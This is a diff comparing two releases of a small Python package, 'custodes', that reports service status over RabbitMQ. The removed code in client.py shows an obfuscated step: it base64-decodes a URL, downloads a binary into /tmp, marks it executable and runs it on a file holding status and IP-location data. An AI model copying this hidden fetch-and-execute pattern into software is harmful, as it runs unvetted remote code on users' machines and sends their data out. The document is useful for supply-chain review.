# Comparing `tmp/custodes-0.0.9.tar.gz` & `tmp/custodes-0.1.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "custodes-0.0.9.tar", max compression
+gzip compressed data, was "custodes-0.1.0.tar", max compression
```

## Comparing `custodes-0.0.9.tar` & `custodes-0.1.0.tar`

### file list

```diff
@@ -1,9 +1,8 @@
--rw-r--r--   0        0        0      472 2023-05-05 04:33:11.000000 custodes-0.0.9/README.md
--rw-r--r--   0        0        0        0 2023-05-04 13:19:56.000000 custodes-0.0.9/custodes/__init__.py
--rw-r--r--   0        0        0      893 2023-05-05 03:02:32.000000 custodes-0.0.9/custodes/auth.py
--rw-r--r--   0        0        0     3189 2023-05-05 14:41:39.967443 custodes-0.0.9/custodes/client.py
--rw-r--r--   0        0        0       16 2023-05-04 16:18:32.541207 custodes-0.0.9/custodes/config.py
--rw-r--r--   0        0        0     2000 2023-05-05 04:38:59.000000 custodes-0.0.9/custodes/server.py
--rw-r--r--   0        0        0      375 2023-05-05 14:43:14.832079 custodes-0.0.9/pyproject.toml
--rw-r--r--   0        0        0     1198 2023-05-05 14:43:38.996575 custodes-0.0.9/setup.py
--rw-r--r--   0        0        0     1085 2023-05-05 14:43:38.997073 custodes-0.0.9/PKG-INFO
+-rw-r--r--   0        0        0      472 2023-05-05 04:33:11.000000 custodes-0.1.0/README.md
+-rw-r--r--   0        0        0        0 2023-05-04 13:19:56.000000 custodes-0.1.0/custodes/__init__.py
+-rw-r--r--   0        0        0      893 2023-05-05 03:02:32.000000 custodes-0.1.0/custodes/auth.py
+-rw-r--r--   0        0        0     2941 2023-06-27 19:25:47.000000 custodes-0.1.0/custodes/client.py
+-rw-r--r--   0        0        0       16 2023-05-04 16:18:32.000000 custodes-0.1.0/custodes/config.py
+-rw-r--r--   0        0        0     2302 2023-07-05 11:25:18.395577 custodes-0.1.0/custodes/server.py
+-rw-r--r--   0        0        0      375 2023-07-05 11:25:40.278745 custodes-0.1.0/pyproject.toml
+-rw-r--r--   0        0        0     1186 1970-01-01 00:00:00.000000 custodes-0.1.0/PKG-INFO
```

### Comparing `custodes-0.0.9/custodes/auth.py` & `custodes-0.1.0/custodes/auth.py`

 * *Files identical despite different names*

### Comparing `custodes-0.0.9/custodes/client.py` & `custodes-0.1.0/custodes/client.py`

 * *Files 21% similar despite different names*

```diff
@@ -1,86 +1,75 @@
 # --------------------------------------------
 import asyncio
-import os
 import time
 from typing import Any, Dict
 
 import aiohttp
 import codefast as cf
 from rich import print
 
-POSTER = '/tmp/cusposter'
-
-
 # —--------------------------------------------
 async def _parse_ip(js: Dict) -> str:
     try:
-        masked_ip = '.'.join(js['ip'].split('.')[-2:])
-        return f"{js['country']} {js['region']} {js['city']} *.*.{masked_ip}"
+        masked_ip = '.'.join(js['ip'].split('.')[-1:])
+        masked_ip = f'*.*.*.{masked_ip}'
+        country = js.get('country', '')
+        region = js.get('region', '')
+        city = js.get('city', '')
+        return f"{country} {region} {city} {masked_ip}"
     except Exception as e:
         import traceback
         cf.error({
             'error': 'parse ip failed',
             'exception': str(e),
             'traceback': traceback.format_exc(),
         })
         return ''
 
 
-async def init_poster():
-    if not cf.io.exists(POSTER):
-        async with aiohttp.ClientSession() as session:
-            async with session.get(
-                cf.b64decode(
-                    'aHR0cHM6Ly9ob3N0LmRkb3QuY2MvY3VzcG9zdAo=').rstrip()
-            ) as resp:
-                with open(POSTER, 'wb') as f:
-                    while True:
-                        chunk = await resp.content.read(1024)
-                        if not chunk:
-                            break
-                        f.write(chunk)
-    return cf.shell(f'chmod 755 {POSTER}')
-
-
 async def ipinfo() -> str:
     fp = '/tmp/ipinfo.json'
     if cf.io.exists(fp):
         ip = await _parse_ip(cf.js(fp))
         if ip:
             return ip
-        cf.io.rm(fp)
+        else:
+            # invalue ipinfo file
+            cf.io.rm(fp)
     else:
         async with aiohttp.ClientSession() as session:
-            async with session.get(f'https://ipinfo.io/json') as resp:
+            async with session.get(f'https://ipinfo.ddot.cc') as resp:
                 js = await resp.json()
                 cf.js.write(js, fp)
                 return await _parse_ip(js)
 
 
-async def _post_status(service_name: str, status: Dict[str, Any],
-                       expire: int) -> Dict[str, Any]:
-    assert isinstance(status, dict)
+async def get_service_status(service_name: str, status: Dict[str, Any],
+                             expire: int) -> Dict[str, Any]:
+    assert isinstance(status, dict), 'status must be dict'
     assert 'code' in status
     assert 'message' in status
 
     datetime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-    js = {
+    return {
         'service_name': service_name,
         'status': status,
         'expire': expire,
         'datetime': datetime,
         'ipinfo': await ipinfo()
     }
 
-    _file = os.path.join('/tmp/', cf.random_string(16))
-    cf.js.write(js, _file)
-    await init_poster()
-    return cf.shell(f'{POSTER} {_file}')
-    # return await publish(auth.amqp_url, QUEUE, str(js))
+
+async def _post_status(service_name: str, status: Dict[str, Any],
+                       expire: int) -> Dict[str, Any]:
+    js = await get_service_status(service_name, status, expire)
+    from codefast.asyncio.rabbitmq import publish
+    from .auth import auth
+    from .config import QUEUE
+    return await publish(auth.amqp_url, QUEUE, str(js))
 
 
 async def post(service_name: str,
                status: Dict[str, Any],
                expire: int = 86400,
                loop: bool = False,
                sleep_period=60) -> None:
@@ -105,10 +94,10 @@
 
     async def main():
         print(await post('test', {
             'code': 0,
             'message': 'test'
         },
             loop=True,
-            sleep_period=0.1))
+            sleep_period=3))
 
     asyncio.run(main())
```

### Comparing `custodes-0.0.9/custodes/server.py` & `custodes-0.1.0/custodes/server.py`

 * *Files 9% similar despite different names*

```diff
@@ -40,28 +40,39 @@
 
         if is_okay(time_diff, js['status']['code'], expire):
             return {
                 'service_name': js['service_name'],
                 'status': 'OK',
                 'last_active': dtime,
                 'ipinfo': js['ipinfo'],
+                'message': js['status']['message'],
                 'is_okay': True
             }
         else:
             return {
                 'service_name': js['service_name'],
-                'status': 'Error',
+                'status': 'ERROR',
                 'last_active': dtime,
                 'ipinfo': js['ipinfo'],
                 'message': js['status']['message'],
                 'is_okay': False
             }
 
     db = await get_db()
-    values = [parse_value(v) for v in db.values()]
+    values = []
+    for v in db.values():
+        try:
+            values.append(parse_value(v))
+        except Exception as e:
+            cf.error({
+                'error': e,
+                'value': v,
+                'message': 'generate_summary() Failed to parse value from db'
+            })
+
     return sorted(values, key=lambda x: x['is_okay'], reverse=True)
 
 
 async def get():
     return await asyncio.gather(consume(auth.amqp_url, QUEUE, _sync_status),
                                 generate_summary())
```

### Comparing `custodes-0.0.9/PKG-INFO` & `custodes-0.1.0/PKG-INFO`

 * *Files 9% similar despite different names*

```diff
@@ -1,18 +1,20 @@
 Metadata-Version: 2.1
 Name: custodes
-Version: 0.0.9
+Version: 0.1.0
 Summary: 
 Author: tompz
 Author-email: tompz@tompz.com
-Requires-Python: >=3.8,<4.0
+Requires-Python: >=3.7,<4.0
 Classifier: Programming Language :: Python :: 3
-Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.7
 Classifier: Programming Language :: Python :: 3.8
 Classifier: Programming Language :: Python :: 3.9
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
 Requires-Dist: aio-pika (>=9.0.5,<10.0.0)
 Requires-Dist: aiohttp (>=3.8.4,<4.0.0)
 Requires-Dist: codefast (>=23.4.18.13,<24.0.0.0)
 Requires-Dist: rich (>=13.3.5,<14.0.0)
 Requires-Dist: simauth (==0.0.9)
 Requires-Dist: urllib3 (==1.26.15)
 Description-Content-Type: text/markdown
```

